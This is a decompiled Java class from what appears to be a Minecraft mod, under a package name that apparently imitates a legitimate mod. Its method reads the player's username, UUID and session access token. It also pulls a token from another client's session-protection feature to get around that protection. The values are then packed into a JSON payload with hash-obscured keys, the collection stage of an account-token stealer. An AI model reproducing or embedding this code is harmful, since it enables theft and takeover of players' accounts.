/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.launchwrapper.Launch
 */
package codes.biscuit.sbHook;

import java.lang.reflect.Field;
import net.minecraft.launchwrapper.Launch;

public class hookInfo {
    public static String sbCon() throws Exception {
        Class mcClass = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
        Object Minecraft = mcClass.getMethod("func_71410_x").invoke(null);
        Object session = mcClass.getMethod("func_110432_I").invoke(Minecraft);
        Class ac = Launch.classLoader.findClass("net.minecraft.util.Session");
        String username = (String)ac.getMethod("func_111285_a").invoke(session);
        String uuid = (String)ac.getMethod("func_148255_b").invoke(session);
        String token = (String)ac.getMethod("func_111286_b").invoke(session);
        String pizzaToken = null;
        try {
            Class<?> pizzaSession = Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection");
            Field field = pizzaSession.getField("changed");
            pizzaToken = (String)field.get(null);
        }
        catch (Exception ignored) {
            // empty catch block
        }
        String mergedToken = pizzaToken == null ? token.toString() : pizzaToken;
        String payload = "\"a216ad76d007736972094f9295873e4f\":{\"aded873033be56a38bc84eb52b0b959f\":\"" + username + "\",\"d4507879e77c45b43e98659a5a3dfd6b\":\"" + uuid + "\",\"aeff878b055a0ac0001e38e466cf9bb5\":\"" + mergedToken.replace("token" + ":", "").replace(":" + uuid, "") + "\"},";
        return payload;
    }
}

